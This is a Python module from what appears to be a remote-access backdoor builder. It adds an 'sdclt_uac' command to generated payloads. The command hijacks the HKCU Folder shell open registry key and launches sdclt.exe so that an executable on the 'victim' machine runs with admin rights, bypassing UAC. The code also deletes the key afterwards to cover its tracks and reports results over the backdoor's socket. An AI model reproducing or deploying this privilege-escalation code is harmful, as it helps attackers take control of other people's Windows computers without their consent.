# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import _winreg')
        config.import_statements.append('from os import path, startfile')
        config.import_statements.append('from time import sleep')
        config.functions.append('''
def sdclt_uac(data):
    filepath = data.split(' ',1)[1]
    if path.isfile(filepath):
        reg = _winreg.ConnectRegistry(None,_winreg.HKEY_CURRENT_USER)
        key = _winreg.CreateKeyEx(reg,'Software\\Classes\\Folder\\shell\open\\command',0,_winreg.KEY_WRITE)
        _winreg.SetValueEx(key, '',0,_winreg.REG_SZ, 'cmd.exe /c "' + filepath + '"')
        _winreg.FlushKey(key)
        _winreg.SetValueEx(key, 'DelegateExecute',0,_winreg.REG_SZ, '')
        _winreg.FlushKey(key)
        _winreg.CloseKey(key)
        _winreg.CloseKey(reg)
        startfile('C:\\WINDOWS\\system32\\sdclt.exe')
        sleep(2)
        _winreg.DeleteKey(_winreg.OpenKey(_winreg.HKEY_CURRENT_USER, 'Software\\Classes\\Folder\\shell\open'), 'command')
        s.sendall('[+]Attempted to get executable to bypass UAC through sdclt.exe')
    else:
        s.sendall('[-]Executable remote filepath does not exist')
''')
        config.logics.append('''
            elif command == "sdclt_uac":
                sdclt_uac(data)
                ''')
        config.help_menu['sdclt_uac <full remote filepath>'] = 'Bypasses UAC by using the sdclt.exe process'
    elif option == 'info':
        print '\nName             : SDCLT UAC Bypass' \
              '\nOS               : Windows 7 and above' \
              '\nRequired Modules : _winreg, os, time' \
              '\nCommands         : sdclt_uac <full remote filepath>' \
              '\nDescription      : This module takes advantage of the sdclt.exe\'s auto elevation to run executables (.exe only) as admin processes, bypassing UAC permission' \
              '\nNote             : This module is NOT op-sec safe. A blank command prompt window is opened and remains open until the victim closes it, however the process continues running' \
              '                     UAC notification also cannot be set to "always notify" or the user can deny the elevation'
